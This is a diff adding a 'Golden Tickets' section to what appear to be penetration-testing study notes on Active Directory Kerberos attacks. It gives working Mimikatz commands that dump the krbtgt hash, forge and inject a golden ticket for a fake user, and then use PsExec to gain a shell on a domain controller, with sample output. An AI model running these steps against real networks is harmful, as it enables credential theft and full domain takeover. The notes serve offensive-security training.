@@ -320,15 +320,62 @@ kerberos::list
 * Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information on the group memberships we put in the silver ticket
 * Depending on the service type, it might also be possible to obtain code execution
 
+## Golden Tickets
 
+* When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key that is known only to the KDC's in the domain
+* This <mark style="color:yellow;">secret key</mark> is actually the password of a domain user account called krbtgt
+* <mark style="color:yellow;">If we are able to gain access to the krbtgt hash, we can create our own TGT or golden tickets!</mark>
+* For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins Group and the domain controller will trust it!
 
+<mark style="color:yellow;">You need to have compromised a member within the Domain Admins group or the Domain Controller itself.</mark>
 
+With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
 
+```
+privilege::debug
+OK
 
+lsadump::lsa /patch
 
+User: krbtgt
+NTLM: 75b60230a2394a812000dbfad8415965
+```
 
+* <mark style="color:yellow;">Remember, you are after the NTLM hash for the krbtgt account!</mark>
 
+Fun fact:&#x20;
 
+Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain.
+
+* Before generating the golden ticket, delete any existing Kerberos tickets with <mark style="color:yellow;">kerberos::purge</mark>
+* We need to supply the domain SID (we can obtain with whoami /user) to the Mimikatz <mark style="color:yellow;">kerberos::golden</mark>&#x20;
+  * This will create the golden ticket
+* Be sure to use the /krbtgt to indicate that you are supplying the hash
+* You can set the golden ticket's username to anything such as fakeuser in this
+* This is because the DC will trust anything that is encrypted by the krbtgt password hash
+
+```
+kerberos::purge
+
+ kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
+2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```
+
+Upon success, you will see:
+
+```
+Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session
+
+misc::cmd
+```
+
+With the golden ticket injected into memory, we can launch a new command prompt with misc::cmd and again attempt lateral movement with PsExec
+
+```
+psexec.exe \\dc01 cmd.exe
+
+C:\Windows\System32>
+```
 
 
 
